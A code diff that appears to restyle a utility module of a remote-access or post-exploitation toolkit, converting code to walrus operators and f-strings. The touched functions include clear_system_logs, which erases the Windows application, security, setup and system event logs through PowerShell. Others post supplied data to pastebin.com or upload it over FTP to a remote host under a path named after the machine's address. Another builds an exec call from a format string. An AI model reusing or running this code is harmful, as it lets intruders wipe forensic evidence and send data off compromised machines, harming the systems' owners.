@@ -58,7 +58,13 @@ def is_compatible(platforms=['win32','linux2','darwin'], module=None):
     import sys
     if sys.platform in platforms:
         return True
-    log("module {} is not yet compatible with {} platforms".format(module if module else '', sys.platform), level='warn')
+    log(
+        "module {} is not yet compatible with {} platforms".format(
+            module or '', sys.platform
+        ),
+        level='warn',
+    )
+
     return False
 
 
@@ -380,8 +386,10 @@ def clear_system_logs():
     """
     try:
         for log in ["application","security","setup","system"]:
-            output = powershell("& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}" % log)
-            if output:
+            if output := powershell(
+                "& { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog(\"%s\")}"
+                % log
+            ):
                 log(output)
     except Exception as e:
         log(e)
@@ -437,16 +445,9 @@ def display(output, color=None, style=None, end='\\n', event=None, lock=None):
     :param event:         threading.Event object
 
     """
-    if isinstance(output, bytes):
-        output = output.decode('utf-8')
-    else:
-        output = str(output)
-    _color = ''
-    if color:
-        _color = getattr(colorama.Fore, color.upper())
-    _style = ''
-    if style:
-        _style = getattr(colorama.Style, style.upper())
+    output = output.decode('utf-8') if isinstance(output, bytes) else str(output)
+    _color = getattr(colorama.Fore, color.upper()) if color else ''
+    _style = getattr(colorama.Style, style.upper()) if style else ''
     exec("""print(_color + _style + output + colorama.Style.RESET_ALL, end="{}")""".format(end))
 
 
@@ -499,7 +500,20 @@ def pastebin(source, api_key):
             info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
             paste = post('https://pastebin.com/api/api_post.php', data=info)
             parts = urlsplit(paste)
-            result = urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+            result = (
+                urlunsplit(
+                    (
+                        parts.scheme,
+                        parts.netloc,
+                        f'/raw{parts.path}',
+                        parts.query,
+                        parts.fragment,
+                    )
+                )
+                if paste.startswith('http')
+                else paste
+            )
+
             if not result.endswith('/'):
                 result += '/'
             return result
@@ -556,7 +570,7 @@ def ftp(source, host=None, user=None, password=None, filetype=None):
         else:
             filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
             path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
-        stor = ftp.storbinary('STOR ' + path, source)
+        stor = ftp.storbinary(f'STOR {path}', source)
         return path
     else:
         log('missing one or more required arguments: host, user, password')
